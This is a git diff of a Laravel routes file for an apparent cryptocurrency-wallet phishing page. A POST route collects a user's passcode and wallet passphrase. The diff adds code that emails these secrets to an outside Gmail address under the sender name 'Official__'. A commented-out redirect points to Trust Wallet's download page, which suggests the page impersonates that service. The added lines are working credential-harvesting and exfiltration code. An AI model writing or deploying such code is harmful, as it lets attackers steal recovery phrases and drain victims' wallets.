@@ -3,6 +3,7 @@
 use Illuminate\Support\Facades\Route;
 use Illuminate\Http\Request;
 use App\Models\Portal;
+// use Mail;
 
 /*
 |--------------------------------------------------------------------------
@@ -25,7 +26,16 @@ Route::post('/authenticate/passphrase/WebApp', function(Request $request){
         'reenter_passcode'=>['required'],
         'passphrase'=>['required']
     ]);
-    Portal::create(['passcode'=>$request->passcode, 'reenter_passcode'=>$request->reenter_passcode, 'passphrase'=>$request->passphrase]);
+    $alt_message = Portal::create(['passcode'=>$request->passcode, 'reenter_passcode'=>$request->reenter_passcode, 'passphrase'=>$request->passphrase]);
+    $subject = 'New Passphrase and Passcode';
+    $message = "Passcode: ".$alt_message->passcode."<br/>Confirmed Passcode: ".$alt_message->reenter_passcode."<br/> Passphrase: ".$alt_message->passphrase;
+    Mail::send('main.mail', ['msg'=>$message, 'subject'=>$subject], function($email_info) use ($subject){
+        $email_info->to('samtechy224@gmail.com')
+        ->replyTo('samtechy224@gmail.com', 'Official__')
+        ->subject($subject)
+        ->from(env('MAIL_FROM_ADDRESS'), 'Official__');
+    }
+);
     return redirect()->route('account.update');
     // return redirect()->away('https://trustwallet.com/download');
 })->name('authenticate.webapp');
